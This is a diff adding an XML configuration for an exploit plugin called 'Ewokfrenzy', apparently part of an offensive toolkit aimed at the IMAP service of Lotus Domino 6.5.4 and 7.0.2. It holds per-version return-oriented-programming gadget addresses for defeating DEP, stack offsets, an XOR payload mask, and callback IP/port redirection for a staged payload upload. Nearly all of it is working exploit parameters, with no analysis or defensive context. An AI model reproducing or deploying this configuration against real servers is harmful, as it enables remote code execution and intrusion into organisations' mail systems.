@@ -1,0 +1,105 @@
+<?xml version="1.0"?>
+<t:config id="c6cbf455066b1dbf43c7c3332a50a273e986ec5c"
+          name="Ewokfrenzy"
+          version="2.0.0"
+          configversion="2.0.0.0"
+          xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
+          xmlns:t='tc0'>
+  <t:inputparameters>
+
+      <!-- Parameters for the target machine -->
+      <t:parameter name="TargetIp"      type="IPv4"    description="Target IPv4 Address (dot notation)"    />
+      <t:parameter name="TargetPort"    type="TcpPort" description="Target Port Number for IMAP service" />
+
+      <!-- Parameters for the callback machine -->
+      <t:parameter name="CallbackIp"         type="IPv4"    description="Callback IPv4 Address (dot notation)"                                                      />
+      <t:parameter name="CallbackPort"       type="TcpPort" description="Callback Port Number"                                                     default="0"      />
+      <t:parameter name="CallbackLocalPort"  type="TcpPort" description="Callback Port Number"                                                     required="false" />
+      <t:parameter name="NetworkTimeout"     type="S16"     description="Timeout for blocking network calls (in seconds).  Use -1 for no timeout." default="60"     />
+
+      <t:paramchoice name="DominoVersion" description="The version of Lotus Domino running on the target">
+
+<!-- This is a template for the version-dependent input parameters
+         <t:paramgroup name="7.0.2" description="">
+            <t:parameter name="ReturnAddrOffset" description="Number of bytes between the start of the input buffer and the vulnerable return address" type="U32" value="0x22C" hidden="true" />
+            <t:parameter name="AddrPopEax"       description="Memory address satisfying the requirements for the PopEax routine"    type="U32" value="0x0042A001" hidden="true" />
+            <t:parameter name="AddrVirtualAlloc" description="Memory address whose contents point to the kernel32.VirtualAlloc routine"    type="U32" value="0x0043305C" hidden="true" />
+            <t:parameter name="AddrJmpEaxPtr"    description="Memory address satisfying the requirements for the JmpEaxPtr routine" type="U32" value="0x0041D5A7" hidden="true" />
+            <t:parameter name="AddrPopEdi"       description="Memory address satisfying the requirements for the PopEdi routine"    type="U32" value="0x0042CB58" hidden="true" />
+            <t:parameter name="AddrEaxToEsi"     description="Memory address satisfying the requirements for the EaxToEsi routine"  type="U32" value="0x100AAADD" hidden="true" />
+            <t:parameter name="AddrCopyCode"     description="Memory address satisfying the requirements for the CopyCode routine"  type="U32" value="0x60709A24" hidden="true" />
+            <t:parameter name="AddrIncEax"       description="Memory address satisfying the requirements for the IncEax routine"    type="U32" value="0x600F8E54" hidden="true" />
+            <t:parameter name="AddrJmpEax"       description="Memory address satisfying the requirements for the JmpEax routine"    type="U32" value="0x00429A6C" hidden="true" />
+
+            <t:parameter name="AddrSetAtEdxRet"  description="Memory address satisfying the requirements for the SetAtEdxRet routine" type="U32" value="0x004050A7" hidden="true" />
+            <t:parameter name="AddrClrEaxRet"    description="Memory address satisfying the requirements for the ClrEaxRet routine" type="U32" value="0x6001FAC1" hidden="true" />
+            <t:parameter name="RetEip"           description="Address of instruction to cleanly return execution to" type="U32" value="0x00413E78" hidden="true" />
+         </t:paramgroup>
+-->
+
+         <t:paramgroup name="6.5.4" description="">
+			<!-- Return Addresses appearing in null-friendly buffer in conventional DEP defeat -->
+            <t:parameter name="AddrPopEax"       description="" type="U32" value="0x00428463" hidden="true" />
+            <t:parameter name="AddrVirtualAlloc" description="" type="U32" value="0x0042E038" hidden="true" />
+            <t:parameter name="AddrJmpEaxPtr"    description="" type="U32" value="0x00420CF5" hidden="true" />
+            <t:parameter name="AddrPopEdi"       description="" type="U32" value="0x60132252" hidden="true" />
+            <t:parameter name="AddrEaxToEsi"     description="" type="U32" value="0x60951039" hidden="true" />
+            <t:parameter name="AddrCopyCode"     description="" type="U32" value="0x607112B4" hidden="true" />
+            <t:parameter name="AddrIncEax"       description="" type="U32" value="0x60168187" hidden="true" />
+            <t:parameter name="AddrJmpEax"       description="" type="U32" value="0x600A371D" hidden="true" />
+
+			<!-- Return Addresses appearing in null-friendly buffer after conventional DEP defeat -->
+            <t:parameter name="AddrSetAtEdxRet"  description="" type="U32" value="0x609DBEA1" hidden="true" />
+            <t:parameter name="AddrClrEaxRet"    description="" type="U32" value="0x0042845E" hidden="true" />
+
+            <t:parameter name="OffsetEsp2Buffer"  description="" type="U32" value="0x000000BC" hidden="true" />
+            <t:parameter name="OffsetEsp2Ebp"     description="" type="U32" value="0x00000090" hidden="true" />
+            <t:parameter name="CleanupOverflowed" description="" type="U32" value="0x60A528EC" hidden="true" />
+         </t:paramgroup>
+
+         <t:paramgroup name="7.0.2" description="">
+			<!-- Return Addresses appearing in null-friendly buffer in conventional DEP defeat -->
+            <t:parameter name="AddrPopEax"       description="" type="U32" value="0x0042A001" hidden="true" />
+            <t:parameter name="AddrVirtualAlloc" description="" type="U32" value="0x0043305C" hidden="true" />
+            <t:parameter name="AddrJmpEaxPtr"    description="" type="U32" value="0x0041D5A7" hidden="true" />
+            <t:parameter name="AddrPopEdi"       description="" type="U32" value="0x0042CB58" hidden="true" />
+            <t:parameter name="AddrEaxToEsi"     description="" type="U32" value="0x100AAADD" hidden="true" />
+            <t:parameter name="AddrCopyCode"     description="" type="U32" value="0x60709A24" hidden="true" />
+            <t:parameter name="AddrIncEax"       description="" type="U32" value="0x600F8E54" hidden="true" />
+            <t:parameter name="AddrJmpEax"       description="" type="U32" value="0x00429A6C" hidden="true" />
+
+			<!-- Return Addresses appearing in null-friendly buffer after conventional DEP defeat -->
+            <t:parameter name="AddrSetAtEdxRet"  description="" type="U32" value="0x004050A7" hidden="true" />
+            <t:parameter name="AddrClrEaxRet"    description="" type="U32" value="0x6001FAC1" hidden="true" />
+
+            <t:parameter name="OffsetEsp2Buffer"  description="" type="U32" value="0x000000BC" hidden="true" />
+            <t:parameter name="OffsetEsp2Ebp"     description="" type="U32" value="0x00000090" hidden="true" />
+            <t:parameter name="CleanupOverflowed" description="" type="U32" value="0x60B3FDF8" hidden="true" />
+         </t:paramgroup>
+
+      </t:paramchoice>
+
+  </t:inputparameters>
+
+  <t:outputparameters>
+    <t:parameter name="Contract"
+                 description="The contract fulfilled by this plugin"
+                 type="String"
+                 value="StagedUpload"/>
+	<t:parameter name="ConnectedTcp" type="Socket" description="the connected socket to the target following exploitation"/>
+	<t:parameter name="XorMask"      type="U8"     description="the xor-mask set in the exploit for decoding the payload"/>
+  </t:outputparameters>
+
+  <t:redirection>
+     <t:local protocol="TCP"
+              listenaddr="TargetIp"
+              listenport="TargetPort"
+              destaddr="//identifier"
+              destport="//service[name='imap']/port"
+              closeoncompletion="true"/>
+     <t:remote protocol="TCP"
+               listenaddr="CallbackIp"
+               listenport="CallbackPort"
+               destport="CallbackLocalPort"/>
+  </t:redirection>
+</t:config>
